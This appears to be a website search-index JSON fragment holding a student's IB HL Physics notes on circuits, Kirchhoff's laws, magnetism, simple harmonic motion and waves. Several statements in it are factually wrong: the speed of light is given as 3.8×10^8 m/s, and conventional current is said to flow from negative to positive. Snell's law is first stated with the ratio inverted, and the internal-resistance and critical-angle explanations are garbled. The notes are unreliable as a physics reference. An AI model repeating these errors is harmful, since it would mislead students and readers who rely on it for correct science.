calculate the slope of \\(V\\) over \\(I\\) as resistance is not defined as \\(\\frac{\\Delta V}{\\Delta I}\\) . Calculate the resistance at each individual data point and calculate the arithmetic maen. Resistance is cuased by electrons imparting energy to the atoms of the material which makes them vibrate faster. This increase in vibration impedes the flow of electrons.","title":"Resistance"},{"location":"IB/HL%20Physics/electricity-magnetism/#resistivity","text":"Resistivity is the property of a material that causse it to oppose a current. It's measured in Ohm-Meters ( \\(\\omega m\\) ) It can be calculated by: \\[ \\rho = \\frac{RA}{l} \\] Where \\(R\\) is the resistance, \\(A\\) is the cross sectional area and \\(l\\) is the length of the conducting material.","title":"Resistivity"},{"location":"IB/HL%20Physics/electricity-magnetism/#simple-circuits","text":"","title":"Simple Circuits"},{"location":"IB/HL%20Physics/electricity-magnetism/#voltage-devider","text":"A voltage devider or potential devider is a circuit that uses resistors to devide one power source into smaller potential differences. The resultant voltage can be found using Ohm's Law. In many cases, the ration of the two resistors will determine the voltage outputs.","title":"Voltage Devider"},{"location":"IB/HL%20Physics/electricity-magnetism/#rheostat-variable-resistor","text":"A variable resistor is a resistor in which it's resistance can be changed. Often, a fillament is used and a selector is attached to select parts of the fillament for the current to pass through.","title":"Rheostat - Variable Resistor"},{"location":"IB/HL%20Physics/electricity-magnetism/#potentiometre","text":"A potentiometer varies the voltage very much like the voltage devider . Here a selector clamps on sections of a fillament thats connected to a power source which we can vary how much material is included which will change the voltage accross the component due to \\(V=IR\\)","title":"Potentiometre"},{"location":"IB/HL%20Physics/electricity-magnetism/#kirchhoffs-circuit-laws","text":"Kirchhoff\u2019s junction rule is a statement of the conservation of charge flow per time. The sum of all currents flowing into a junction must equal the sum of all currents flowing out. \\[ \\sum{I_{in}} =\\sum{I_{out}} \\] Kirchhoff\u2019s loop rule is a statement of the conservation of electric potential energy per charge. For a complete loop of an electrical circuit all of the electric potential rises added together must equal all of the electric potential drops added together. \\[ \\sum_{\\text {loop }} \\Delta V_{\\text {rises }}=\\sum_{\\text {loop }} \\Delta V_{\\text {drops }} \\]","title":"Kirchhoff's Circuit Laws"},{"location":"IB/HL%20Physics/electricity-magnetism/#usage-of-kirchhoffs-circuit-laws","text":"We can use Kirchoff's Circuit Laws to find the voltage, current and power accross a resistor in a circuit with two power sources. Here are a set of rules based on Kirchoff's Laws: Follow the direction of conventional current (from - to +) if a power source's negative terminal is encountered, there will be a potential rise if a power source's positive terminal is encountered, there will be a potential drop if a current is encountered in the same direction as the travelling current, there will be a potential drop of \\(I\\times R\\) if a current is encountered in the opposite direction as the travelling current, there will be a potential rise of \\(I\\times R\\) The best way to approach is to first start on the negative side of each power source and draw the current path following conventional current. Here's an example: following yellow Potential rise of \\(V_A\\) Potential drop of \\(I_A\\times 4\\) Potential rise of \\(I_B\\times 5\\) due to encountering current in opposite direction Potential drop of \\(I_A\\times 5\\) Potential drop of \\(I_A\\times 2\\) following orange Potential rise of \\(V_B\\) Potential drop of \\(I_B\\times 6\\) Potential rise of \\(I_A\\times 5\\) due to encountering current in opposite direction Potential drop of \\(I_B\\times 5\\) Potential drop of \\(I_B\\times 10\\) In the end, both loops must result with a potential difference of 0. Thus we can solve for \\(I_A\\) and \\(I_B\\) . We can also follow the total loop and equate that to 0. following green Potential rise of \\(V_A\\) Potential drop of \\(I_A\\times 4\\) Potential drop of \\(I_B\\times 10\\) Potential rise of \\(V_B\\) Potential drop of \\(I_B\\times 6\\) Potential drop of \\(I_A\\times 2\\)","title":"Usage of Kirchhoff's Circuit Laws"},{"location":"IB/HL%20Physics/electricity-magnetism/#electric-cells","text":"","title":"Electric cells"},{"location":"IB/HL%20Physics/electricity-magnetism/#cells","text":"A cell in a circuit acts as a source of electrical energy and creates an electric potential difference at its terminals. A battery is often made up of two or more cells connected.","title":"Cells"},{"location":"IB/HL%20Physics/electricity-magnetism/#internal-resistance","text":"The internal resistance is the resistance of a source determined by the material it is made up of. Any material that makes power has internal resistance, this includes batteries, power supplies, power genrators etc. The potential difference at the terminals of a source is less than the EMF of the source due to internal resistance which can be used to calculated the EMF since EMF includes both internal and external resistance.","title":"Internal Resistance"},{"location":"IB/HL%20Physics/electricity-magnetism/#how-to-measure-internal-resistance","text":"Since we cannot go into a power source and maesure the resistance, we can estimate it using data. In this setup, we know that EMF is equal to the internal resistance times the current plus the terminal voltage. By measuring the current and terminal voltage, we can find the internal resistance if we graph data points of terminal voltage against current. When terminal voltage is 0, EMF is also 0 thus we can find the internal resistance. Note that a good voltmeter(multimeter these days) can measure EMF pretty well since they have a really large internal resistance and a very small current. Thus the measured voltage is very close to EMF.","title":"How to Measure Internal Resistance"},{"location":"IB/HL%20Physics/electricity-magnetism/#magnetism","text":"","title":"Magnetism"},{"location":"IB/HL%20Physics/electricity-magnetism/#magnetic-fields","text":"Magnetic fields are caused by the presence of magnets or moving charges. Similar to how an electric charge experiences a force in an electric field, a magnet or an electric current experiences a force in a magnetic field. The unit of a magnetic field is Tesla (T) with the symbol \\(\\vec{B}\\) and is \\(1\\ kg\\cdot s^{-2}\\cdot A^{-1}\\) in SI units. By convention, the direction of magnetic field is always from North to South A single magnetic domain is the smallest magnet. If all small magnetic domains align, it craetes a larger magnetic field.","title":"Magnetic Fields"},{"location":"IB/HL%20Physics/electricity-magnetism/#magnetic-field-patterns","text":"Magnetic fields can be graphically represented using magnetic field lines. The direction of the field at a point is equal to the direction of the field line passing through that point. The magnitude of the field at a point corresponds to the density of the field lines around that point. Magnets Wire with current Viewing the magnetic field in 3D, dots represent magnetic fields coming out of the page (like the tip of an arrow) and crosses represent magnetic fields going into the page (like the nock of an arrow).","title":"Magnetic Field Patterns"},{"location":"IB/HL%20Physics/electricity-magnetism/#magnetic-field-strength","text":"The magnetic field strength is proportional to the current that passes through the conductor and is inversly porportional to the radial distance in which the field is measured. The magnetic field strength can be calculated using the following formula: \\[ \\vec{B}=\\frac{\\mu_{0}I}{2\\pi r} \\] where \\(\\mu_{0}\\) is the permiability of free space which is \\(4\\pi\\times 10^{-7}\\cdot T\\cdot m\\cdot A^{-1}\\) , \\(I\\) is the current, and \\(r\\) is the radial distance.","title":"Magnetic Field Strength"},{"location":"IB/HL%20Physics/electricity-magnetism/#right-hand-rule","text":"To find the direction in which the magnetic field is pointing, the right hand rule is used. Using the right hand, we use the thumb to point towards the direction of the current and dircetion the four other fingers point is the direction of the magnetic field.","title":"Right Hand Rule"},{"location":"IB/HL%20Physics/electricity-magnetism/#magnetic-force","text":"","title":"Magnetic Force"},{"location":"IB/HL%20Physics/electricity-magnetism/#complete-right-hand-rule","text":"Another right hand rule can help us find the direction of the force on a conductor in a magnetic field. To do so: Line up four fingers with the magnetic field Align thumb with the directin of conventional current The direction of the inner palm is the direction of the force. If the angle between the conductor and field is not \\(90\\degree\\) , if the thumb is pointing up, the direction is pointing outwards and vice verca.","title":"Complete Right Hand Rule"},{"location":"IB/HL%20Physics/electricity-magnetism/#on-a-conductor","text":"The magnitude of the force acting on a moving charge due to a magnetic field can be given by \\[ F = Il\\vec{B}\\sin(\\theta) \\] where F is the force acting on the wire, I is the current through the conductor ,l is the length of conductor in the field, and \u03b8 is the angle between the direction of the field and the conductor.","title":"On a Conductor"},{"location":"IB/HL%20Physics/electricity-magnetism/#on-a-point-charge","text":"The force a magnetic force on a point charge through a magnetic field is found by: \\[ \\begin{align*} F &= \\frac{q}{t}l\\vec{B}\\sin{\\theta}\\\\ &= vq\\vec{B}\\sin{\\theta} \\end{align*} \\] where \\(q\\) is the charge of the particle(often its \\(1.6\\times 10^{-19}\\) for proton/electron), \\(v\\) is the velocity the particle is traveling at, \\(\\vec{B}\\) is the magnetic field and \\(\\theta\\) is the angle between the magnetic fields and the directon of the velocity. Note that to find the direction of the force, the Right Hand Rule can still be used but make sure to flip the direction of velocity(thumb) if the point charge is negative.","title":"On a Point Charge"},{"location":"IB/HL%20Physics/electricity-magnetism/#balancing-magnetic-field","text":"The charge will not travel in a straight line in an electrical field but we can balance that with another magnetic field. First, a electron gun will shoot out an electron using a potential difference: It travels through a electric field created by \\(V_p\\) with velocity \\(v\\) and we add a magnetic field with the force \\(F_B\\) countering the attraction of \\(F_e\\) . In order for the electron to travel straight: \\[ \\begin{align*} F_e &= F_B\\\\ qE &= qv\\vec{B}\\sin{\\theta}\\\\ E &= v\\vec{B}\\\\ \\frac{E}{B}&=v=\\sqrt{\\frac{2V_A}{m}}\\\\ \\frac{q}{m}&=\\frac{E^2}{2B^2V_A} \\end{align*} \\] This is how we fould the ratio of charge to mass of an electron. (J.J. Tomson)","title":"Balancing Magnetic Field"},{"location":"IB/HL%20Physics/measurement/","text":"","title":"Measurement"},{"location":"IB/HL%20Physics/mechanics/","text":"","title":"Mechanics"},{"location":"IB/HL%20Physics/thermal-physics/","text":"","title":"Thermal physics"},{"location":"IB/HL%20Physics/waves/","text":"Unit 4: Waves \u00b6 Oscillations, Vibrations and Waves \u00b6 When an object vibrates back and forth or up and down with a regular repeating motion we describe it as oscillations. A pendulum, a mass attacked to a spring are examples of oscillation. Properties of oscillation \u00b6 Displacement (x) : The distance from the equilibrium position at an instant in time measured in metres, m. Amplitude (A) : The amplitude of an oscillator is the maximum displacement of the particles from the equilibrium position measured in metres, m. Period (T) : The (Time) period is the time it takes for one complete oscillation to happen often measured as the time it takes to oscillates from one point back to the same point in the next cycle. Period is in seconds, s. Frequency (f) : Frequency is a measure of how often something happens, in this case how many complete oscillations occurs in one second. It's liked to period of the wave by the following equation: \\(T=\\frac{1}{f}\\) or \\(f=\\frac{1}{T}\\) Frequency is measure in Hertz, Hz Phase Difference : The measure of how \"in step\" different particles are. If they are moving together they are said to be in phase. If not they are said to be out of phase. Phase difference is measured in radians, rad. Simple Harmonic Motion \u00b6 In each of the simple harmonic motion oscillators shown above, the object is oscillating back and forth or up and down with a constant time period. SMH Characteristics \u00b6 The equilibrium point is where the object comes to rest. If we displace the object by \\(x\\) metres there will be a force that brings the object back to the equilibrium point. We can represent this as \\[ F\\ \\alpha-x \\] Since \\(F=ma\\) and the mass of the object is constant, we can also write \\[ a\\ \\alpha-x \\] Thus we can see that for an object to be moving in SMH: The acceleration is proportional to the displacement The acceleration is always towards the equilibrium (opposite to the displacement) This means if we graph the acceleration \\(a\\) against displacement \\(x\\) we will get the following graph Equations for SMH \u00b6 The following equations are for all SHM systems but consider a simple pendulum and a mass on a spring hanging from the ceiling. Period \u00b6 The period of a SHM depends on the type of SHM system but in the case of a pendulum the equation for the period is \\[ T=2\\pi\\sqrt{\\frac{l}{g}} \\] where \\(l\\) is the length of the string attacked to the mass and \\(g\\) the gravitational constant. However, the period in a SHM where a mass is attached to a string, the period is calculated as \\[ T=2\\pi\\sqrt{\\frac{m}{k}} \\] where \\(m\\) is the mass and \\(k\\) is the spring constant. Looking at a mass attached to a spring, we can also use Hooks Law to see that the acceleration is in fact proportional and opposite to displacement \\[ \\begin{align*} F&=-kx\\\\ F&=ma\\\\ a &= -\\frac{k}{m}x \\end{align*} \\] Displacement \u00b6 The displacement of the mass on the pendulum or the spring \\(x\\) is given by the equation \\[ x = A\\cos{2\\pi ft} \\] and since frequency \\(f=\\frac{1}{T}\\) , the equation can also become \\[ x = A\\cos{2\\pi\\frac{t}{T}} \\] Where \\(t\\) is the time into the cycle and \\(T\\) is the period for one complete cycle and \\(A\\) is the amplitude of the wave. Velocity \u00b6 The velocity of the mass at displacement \\(x\\) can be calculated by \\[ v = \\pm2\\pi f\\sqrt{A^2-x^2} \\] Maximum velocity occurs when the pendulum is at equilibrium (lowest point) or the mass on the spring is at equilibrium (middle) where displacement is 0. Acceleration \u00b6 The acceleration of the mass at displacement \\(x\\) is given by \\[ a = -(2\\pi f)^2x \\] We can see that acceleration is always the opposite direction of displacement. Maximum acceleration occurs at the end of the swings in a pendulum and at the highest and lowest point of the mass on a spring when displacement is equal to the Amplitude. SHM Graphs \u00b6 When released from A the bob accelerates and moves to the centre point. When it reached B it has reached a maximum velocity in the positive direction and then begins to slow down. At C it has stopped completely so the velocity is zero, it is at a maximum displacement in the positive and accelerates in the negative direction. At D it is back to the centre point and moves at maximum velocity in the negative direction. By E the velocity has dropped to zero, maximum negative displacement and a massive acceleration as it changes direction. This repeats as the pendulum swings through F, G, H and back to I. Below are the graphs of displacement, velocity and acceleration: Gradients of the Graph \u00b6 Since \\(v=\\frac{\\Delta x}{\\Delta t}\\) , the gradient of the displacement time graph gives us the velocity. The velocity graph is the derivative of the displacement graph. As shown, the gradient at point A,C,E,G,I are all 0 thus velocity is also 0. Since \\(a=\\frac{\\Delta v}{\\Delta t}\\) , the gradient of the velocity time graph gives us the acceleration. The acceleration graph is the derivative of the velocity time graph. As shown, at points B,D,F,H the gradient of velocity graph is 0 thus acceleration is 0. Energy in SHM \u00b6 When talking about Energy and Waves: All waves require a medium to travel except Electromagnetic Waves The speed of a wave is the speed which energy is transferred. It only depends on the medium. Traveling waves transmit energy. In all simple harmonic motion systems,there is a conversion between kinetic energy and potential energy. The total energy of the system remains constant . (This is only true for isolated systems) For a simple pendulum there is a transformation between kinetic energy and gravitational potential energy. At its lowest point it has minimum gravitational and maximum kinetic, at its highest point (when displacement is a maximum) it has no kinetic but a maximum gravitational. This is shown in the graph. For a mass on a spring there is a transformation between kinetic energy, gravitational potential energy and the energy stored in the spring (elastic potential). At the top there is maximum elastic and gravitational but minimum kinetic. In the middle there is maximum kinetic, minimum elastic but it still has some gravitational. At its lowest point it has no kinetic, minimum gravitational but maximum elastic. Below is a graph of the energy of the mass graphed with displacement over time: As shown, the energy of the system is proportional to the amplitude squared \\(E\\ \\alpha A^2\\) and NOT the frequency counter to popular belief. Traveling Waves \u00b6 Traveling waves transport energy from one area of space to another, whereas standing waves do not transport energy. Traveling waves are not confined to a given space along the medium like an ocean wave. Longitudinal Waves \u00b6 Here is a longitudinal wave; the oscillations are parallel to the direction of propagation (travel). Think about a slinky or sound waves. Where the particles are close together, we call a compression and where they are spread, we call a rarefaction . The wavelength is the distance from one compression or rarefaction to the next. The amplitude is the maximum distance the particle moves from its equilibrium position to the right of left. An example of this would be sound waves. A sound wave approximately travels at \\(343.2\\ ms^{-1}\\) at \\(20\\degree C\\) . Transverse Waves \u00b6 Here is a transverse wave; the oscillations are perpendicular to the direction of propagation. Think about a string. Where the particles are displaced above the equilibrium position, we call a crest and below we call a trough . The wavelength, \\(\\lambda\\) , is the distance from one peak or trough to the next. The amplitude is the maximum distance the particle moves from its equilibrium position up or down. An example would be water waves or EM waves. Electromagnetic Spectrum \u00b6 Electromagnetic waves are transverse waves produced by oscillating and magnetically fields. It doesn't need a medium to transfer energy. The image below shows the EM spectrum from low frequency, low energy, long wavelength to high frequency, high energy and short wavelength. EM waves have two components, a vertical and horizontal component. The vertical component is often the Electric component and horizontal the Magnetic component. All EM waves travel at the speed of light \\(3.8 \\times 10^8\\ ms^{-1}\\) . The Universal Wave Equation \u00b6 The wave speed of a wave \\(v\\) , it\u2019s frequency \\(f\\) and it\u2019s wavelength \\(\\lambda\\) , are related by the equation: \\[ V=f\\lambda \\] Where \\(V\\) is the speed of the wave in \\(ms^{-1}\\) , frequency in \\(Hz\\) and wavelength in \\(m\\) . Wave Characteristics \u00b6 Wavefronts and Rays \u00b6 Wavefronts : are lines joining points which vibrate in phase with each other. Wavefronts can be straight lines or curves and the distance between successive wavefronts is the wavelength of the wave. Rays : are lines that indicate the direction of a wave propagation. They are always perpendicular to wavefronts. Amplitude and Intensity \u00b6 The intensity is defined as the power per unit area \\(\\frac{P}{A}\\) and is measured in \\(wm^{-2}\\) . The amplitude and intensity of the wave is corelate to the energy the wave has. The intensity of the wave is proportional to the square of it's amplitude thus \\(I\\alpha A^2\\) . This is the inverse square law. Polarization \u00b6 Only transverse waves can be polarized. Polarization restricts the oscillations of a transverse wave to one plane. In the diagrams, the light is initially oscillating in all directions perpendicular to the wave direction. A piece of Polaroid only allows light transmission in one plane, filtering out oscillations in other oscillations. This is proof that the waves of the EM spectrum are transverse waves. If they were longitudinal waves the forwards and backwards motion would not be stopped by crossed pieces of Polaroid; the bottom set up would emit light. Malu's Law \u00b6 Malu's law states that the intensity of plane-polarized light that passes through an analyzer varies as the square of the cosine of the angle between the plane of the polarizer and the transmission axes of the analyzer defined by \\[ I = I_0 \\cos^2{\\theta} \\] Usages of Polarization \u00b6 Polarization can be used to analyze optically active substances which rotates the plane of polarization such as sugar. The sweetness of the sugar is reflected by the intensity that passes through. Another use case is LCD or Liquid Crystal Displays. The liquid crystal will change is polarization when electricity is applied and thus being able to be seen through another polarizing film. Superposition \u00b6 Superposition is the process by which two waves combine into a single wave form when they overlap. If we add these waves together the resultant depends on where the peaks of the waves are compared to each other. The principal of superposition states that when two waves meet the resultant displacement is the sum of the individual displacements. Here are three examples of what the resultant could be: a wave with an amplitude of 1.5 , no resultant wave at all and a wave with an amplitude of 2.0 Path Difference : If two waves from the same source arrive at a point having taken a different path (Eg one of them reflected), they may have traveled different distances from the source. This difference in journey is called the path difference. The path difference directly impacts how the wave superpositions itself with the other wave. If the path difference is equal to a whole number of wavelengths ( \\(PD=\u03bb, 2\u03bb, 3\u03bb, 4\u03bb\u2026\\) ), the two waves will be in phase at this point and constructive interference will be observed (addition of amplitudes). If the path difference is a multiple of half a wavelength ( \\(PD=0.5\u03bb, 1.5\u03bb, 2.5\u03bb,3.5\u03bb\u2026\\) ), the two waves will be in anti-phase at that point (\"out of phase\") and destructive interference will be observed (reduction of amplitude/cancellation). Wave Behaviors \u00b6 Refraction \u00b6 Refraction is the change in direction of a wave when it transmits from one medium to another. An example would be a light ray refracting when entering water. Refractive Index \u00b6 The refractive index of a material is a measure of how easy it is for light to travel through it. The refractive index of material s can be calculated using: \\[ n = \\frac{c}{c_s} \\] Where \\(n\\) is the refractive index, \\(c\\) is the speed of light in a vacuum and \\(c_s\\) is the speed of light in the material. Note that the higher the refractive index, the slower light can travel through it. The higher the refractive index, the denser is the material. If the ray of light is incident at 90\u00b0 to the material then there is no change in direction, only speed. When light passes from one material to another it is not only the speed of the light that changes, the direction often changes too. The angle of incidence, \\(\\theta_1\\) , and the angle of refraction, \\(\\theta_2\\) , is given by Snell's Law : \\[ \\frac{n_1}{n_2} = \\frac{\\sin{\\theta_1}}{\\sin{\\theta_2}} \\] In this case, \\(n_1\\) always the faster medium and \\(n_2\\) having a larger index of refraction. When a wave travels from fast-to-slow: the wave bends towards normal; slow-to-fast: away from normal. A good way of thinking it is using wavefronts. In addition, the refractive indices are also related as following using the Universal Wave Equation : \\[ \\frac{\\sin \\theta_{1}}{\\sin \\theta_{2}}=\\frac{n_{2}}{n_{1}}=\\frac{\\lambda_{1}}{\\lambda_{2}}=\\frac{v_{1}}{v_{2}} \\] As shown when a wave travels through an intersection the frequency never changes but the wavelength and speed changes. Reflection \u00b6 Reflection happens when an incoming incident wave hits a reflecting surface. As shown in the image above, the angle of incidence is always equal to the angle of reflection. The normal is the arbitrary perpendicular line to the reflecting surface. The reflection of waves if one end is tied is inverted as shown: reflection of waves from a free end is not inverted: Critical Angle \u00b6 When light travels from one medium to another the majority of light refracts but some of the light also reflects off of the junction and stays in the original material. When an incident ray strikes the boundary of two mediums at an angle less than the critical angle, the light refracts into the second medium. If the ray strikes equal to the critical angle, the light is right along the junction. When the incident ray is greater than the critical angle, all the light is reflected into the original medium. The critical angle can be found using the relationship between the refractive index of the two materials. Derived from Snell's Law by substituting \\(\\theta_2=90\\degree\\) \\[ \\sin{\\theta_{c}}=\\frac{1}{n_1} \\] Total Internal Reflection \u00b6 Total internal reflection only occurs when the light ray propagates from a optically denser medium to an optically less dense medium (always from the slower medium). An important usage is optical fibres, which is thin piece of flexible glass. Diffraction \u00b6 Diffraction is when a wave bends as it passes through an obstacle or through an opening. The amount of diffraction depends on the wavelength compared to the gap as shown. When the wavelength is roughly equal to the slit width, maximum diffraction occurs. Waves can also ben about any obstacle, for example a wall or corner. Huygen's Principal : Every wavefront is made of series of circular wavesources. The new position of the wavefront is formed by connecting the circular wavefronts from the previous wavefront. Superposition & Interference \u00b6 Superposition is explained previously here . Interference is a special case of superposition where the waves that combine are coherent. The waves overlap and form a repeating interference pattern of maxima and minima areas. If the waves weren\u2019t coherent the interference pattern would change rapidly and continuously. Constructive interference occurs when two pulses displaced in the same direction cause an overlap. The resultant displacement is the sum of both displacements. Destructive interference occurs when two pulses displaced in opposite directions cause an overlap. The resultant displacement is the difference of both displacements. Standing Waves \u00b6 When two similar waves travel in opposite directions, they can superpose to form a standing (or stationary) wave. Here is the experimental set up of how we can form a standing wave on a string. The vibration generator sends waves down the string at a certain frequency, they reach the end of the string and reflect back at the same frequency. On their way back the two waves traveling in opposite direction superpose to form a standing wave made up of nodes and antinode. Nodes : Positions on a standing wave which do not vibrate. The waves combine to give zero displacement Anti-nodes : Positions on a standing wave where there is a maximum displacement. Traveling vs Standing Waves \u00b6 Standing Waves Traveling Waves Amplitude Maximum at antinode and zero at nodes The same for all parts of the wave Frequency All parts of the wave have the same frequency All parts of the wave have the same frequency Wavelength Twice the distance between adjacent nodes The distance between two adjacent peaks Phase All points between two adjacent nodes in phase Points one wavelength apart in phase Energy No energy translation Energy translation in the direction of the wave Waveform Does not move forward Moves forwards Harmonics \u00b6 As we increase the frequency of the vibration generator, we can see standing waves being set up. The first will occur when the generator is vibrating at the fundamental frequency, f0, of the string. First Harmonic \\(f = f_0 \\lambda = 2 L\\) 2 nodes and 1 antinode Second Harmonic \\(f = 2f_0 \\lambda = L\\) 3 nodes and 2 antinodes Third Harmonic \\(f = 3f_0 \\lambda = \\frac{2}{3} L\\) 4 nodes and 3 antinodes Fourth Harmonic \\(f = 4f_0 \\lambda = \\frac{1}{2} L\\) 5 nodes and 4 antinodes A string with a free end will produce an anti-node at the end point, compared to a node if the end is fixed. Similarly, standing waves in open ended pipes produce anti-nodes at the ends, whereas closed pipes produce nodes at the end points. Aircolumns \u00b6 Eliminating \"End Effect\" \u00b6 The end effect refers to the small section (denoted as \\(\\Delta x\\) ) where the wave doesn't quite know if it's free to travel in air yet and thus result in inaccurate measurements. To combat this, we can move the air column in water down until we hear the first time the sound is loud, this is when the aircolumn is at it's first harmonic with wavelength \\(\\frac{\\lambda}{4}\\) . We can move it further down when the sound becomes loud once again at the 3rd harmonic which has a wavelength of \\(\\frac{3\\lambda}{4}\\) . With simple math, we can accurately calculate the wavelength. And since the end effect is present on both harmonics, when subtracting, it's eliminated.","title":"Unit 4: Waves"},{"location":"IB/HL%20Physics/waves/#unit-4-waves","text":"","title":"Unit 4: Waves"},{"location":"IB/HL%20Physics/waves/#oscillations-vibrations-and-waves","text":"When an object vibrates back and forth or up and down with a regular repeating motion we describe it as oscillations. A pendulum, a mass attacked to a spring are examples of oscillation.","title":"Oscillations, Vibrations and Waves"},{"location":"IB/HL%20Physics/waves/#properties-of-oscillation","text":"Displacement (x) : The distance from the equilibrium position at an instant in time measured in metres, m. Amplitude (A) : The amplitude of an oscillator is the maximum displacement of the particles from the equilibrium position measured in metres, m. Period (T) : The (Time) period is the time it takes for one complete oscillation to happen often measured as the time it takes to oscillates from one point back to the same point in the next cycle. Period is in seconds, s. Frequency (f) : Frequency is a measure of how often something happens, in this case how many complete oscillations occurs in one second. It's liked to period of the wave by the following equation: \\(T=\\frac{1}{f}\\) or \\(f=\\frac{1}{T}\\) Frequency is measure in Hertz, Hz Phase Difference : The measure of how \"in step\" different particles are. If they are moving together they are said to be in phase. If not they are said to be out of phase. Phase difference is measured in radians, rad.","title":"Properties of oscillation"},{"location":"IB/HL%20Physics/waves/#simple-harmonic-motion","text":"In each of the simple harmonic motion oscillators shown above, the object is oscillating back and forth or up and down with a constant time period.","title":"Simple Harmonic Motion"},{"location":"IB/HL%20Physics/waves/#smh-characteristics","text":"The equilibrium point is where the object comes to rest. If we displace the object by \\(x\\) metres there will be a force that brings the object back to the equilibrium point. We can represent this as \\[ F\\ \\alpha-x \\] Since \\(F=ma\\) and the mass of the object is constant, we can also write \\[ a\\ \\alpha-x \\] Thus we can see that for an object to be moving in SMH: The acceleration is proportional to the displacement The acceleration is always towards the equilibrium (opposite to the displacement) This means if we graph the acceleration \\(a\\) against displacement \\(x\\) we will get the following graph","title":"SMH Characteristics"},{"location":"IB/HL%20Physics/waves/#equations-for-smh","text":"The following equations are for all SHM systems but consider a simple pendulum and a mass on a spring hanging from the ceiling.","title":"Equations for SMH"},{"location":"IB/HL%20Physics/waves/#period","text":"The period of a SHM depends on the type of SHM system but in the case of a pendulum the equation for the period is \\[ T=2\\pi\\sqrt{\\frac{l}{g}} \\] where \\(l\\) is the length of the string attacked to the mass and \\(g\\) the gravitational constant. However, the period in a SHM where a mass is attached to a string, the period is calculated as \\[ T=2\\pi\\sqrt{\\frac{m}{k}} \\] where \\(m\\) is the mass and \\(k\\) is the spring constant. Looking at a mass attached to a spring, we can also use Hooks Law to see that the acceleration is in fact proportional and opposite to displacement \\[ \\begin{align*} F&=-kx\\\\ F&=ma\\\\ a &= -\\frac{k}{m}x \\end{align*} \\]","title":"Period"},{"location":"IB/HL%20Physics/waves/#displacement","text":"The displacement of the mass on the pendulum or the spring \\(x\\) is given by the equation \\[ x = A\\cos{2\\pi ft} \\] and since frequency \\(f=\\frac{1}{T}\\) , the equation can also become \\[ x = A\\cos{2\\pi\\frac{t}{T}} \\] Where \\(t\\) is the time into the cycle and \\(T\\) is the period for one complete cycle and \\(A\\) is the amplitude of the wave.","title":"Displacement"},{"location":"IB/HL%20Physics/waves/#velocity","text":"The velocity of the mass at displacement \\(x\\) can be calculated by \\[ v = \\pm2\\pi f\\sqrt{A^2-x^2} \\] Maximum velocity occurs when the pendulum is at equilibrium (lowest point) or the mass on the spring is at equilibrium (middle) where displacement is 0.","title":"Velocity"},{"location":"IB/HL%20Physics/waves/#acceleration","text":"The acceleration of the mass at displacement \\(x\\) is given by \\[ a = -(2\\pi f)^2x \\] We can see that acceleration is always the opposite direction of displacement. Maximum acceleration occurs at the end of the swings in a pendulum and at the highest and lowest point of the mass on a spring when displacement is equal to the Amplitude.","title":"Acceleration"},{"location":"IB/HL%20Physics/waves/#shm-graphs","text":"When released from A the bob accelerates and moves to the centre point. When it reached B it has reached a maximum velocity in the positive direction and then begins to slow down. At C it has stopped completely so the velocity is zero, it is at a maximum displacement in the positive and accelerates in the negative direction. At D it is back to the centre point and moves at maximum velocity in the negative direction. By E the velocity has dropped to zero, maximum negative displacement and a massive acceleration as it changes direction. This repeats as the pendulum swings through F, G, H and back to I. Below are the graphs of displacement, velocity and acceleration:","title":"SHM Graphs"},{"location":"IB/HL%20Physics/waves/#gradients-of-the-graph","text":"Since \\(v=\\frac{\\Delta x}{\\Delta t}\\) , the gradient of the displacement time graph gives us the velocity. The velocity graph is the derivative of the displacement graph. As shown, the gradient at point A,C,E,G,I are all 0 thus velocity is also 0. Since \\(a=\\frac{\\Delta v}{\\Delta t}\\) , the gradient of the velocity time graph gives us the acceleration. The acceleration graph is the derivative of the velocity time graph. As shown, at points B,D,F,H the gradient of velocity graph is 0 thus acceleration is 0.","title":"Gradients of the Graph"},{"location":"IB/HL%20Physics/waves/#energy-in-shm","text":"When talking about Energy and Waves: All waves require a medium to travel except Electromagnetic Waves The speed of a wave is the speed which energy is transferred. It only depends on the medium. Traveling waves transmit energy. In all simple harmonic motion systems,there is a conversion between kinetic energy and potential energy. The total energy of the system remains constant . (This is only true for isolated systems) For a simple pendulum there is a transformation between kinetic energy and gravitational potential energy. At its lowest point it has minimum gravitational and maximum kinetic, at its highest point (when displacement is a maximum) it has no kinetic but a maximum gravitational. This is shown in the graph. For a mass on a spring there is a transformation between kinetic energy, gravitational potential energy and the energy stored in the spring (elastic potential). At the top there is maximum elastic and gravitational but minimum kinetic. In the middle there is maximum kinetic, minimum elastic but it still has some gravitational. At its lowest point it has no kinetic, minimum gravitational but maximum elastic. Below is a graph of the energy of the mass graphed with displacement over time: As shown, the energy of the system is proportional to the amplitude squared \\(E\\ \\alpha A^2\\) and NOT the frequency counter to popular belief.","title":"Energy in SHM"},{"location":"IB/HL%20Physics/waves/#traveling-waves","text":"Traveling waves transport energy from one area of space to another, whereas standing waves do not transport energy. Traveling waves are not confined to a given space along the medium like an ocean wave.","title":"Traveling Waves"},{"location":"IB/HL%20Physics/waves/#longitudinal-waves","text":"Here is a longitudinal wave; the oscillations are parallel to the direction of propagation (travel). Think about a slinky or sound waves. Where the particles are close together, we call a compression and where they are spread, we call a rarefaction . The wavelength is the distance from one compression or rarefaction to the next. The amplitude is the maximum distance the particle moves from its equilibrium position to the right of left. An example of this would be sound waves. A sound wave approximately travels at \\(343.2\\ ms^{-1}\\) at \\(20\\degree C\\) .","title":"Longitudinal Waves"},{"location":"IB/HL%20Physics/waves/#transverse-waves","text":"Here is a transverse wave; the oscillations are perpendicular to the direction of propagation. Think about a string. Where the particles are displaced above the equilibrium position, we call a crest and below we call a trough . The wavelength, \\(\\lambda\\) , is the distance from one peak or trough to the next. The amplitude is the maximum distance the particle moves from its equilibrium position up or down. An example would be water waves or EM waves.","title":"Transverse Waves"},{"location":"IB/HL%20Physics/waves/#electromagnetic-spectrum","text":"Electromagnetic waves are transverse waves produced by oscillating and magnetically fields. It doesn't need a medium to transfer energy. The image below shows the EM spectrum from low frequency, low energy, long wavelength to high frequency, high energy and short wavelength. EM waves have two components, a vertical and horizontal component. The vertical component is often the Electric component and horizontal the Magnetic component. All EM waves travel at the speed of light \\(3.8 \\times 10^8\\ ms^{-1}\\) .","title":"Electromagnetic Spectrum"},{"location":"IB/HL%20Physics/waves/#the-universal-wave-equation","text":"The wave speed of a wave \\(v\\) , it\u2019s frequency \\(f\\) and it\u2019s wavelength \\(\\lambda\\) , are related by the equation: \\[ V=f\\lambda \\] Where \\(V\\) is the speed of the wave in \\(ms^{-1}\\) , frequency in \\(Hz\\) and wavelength in 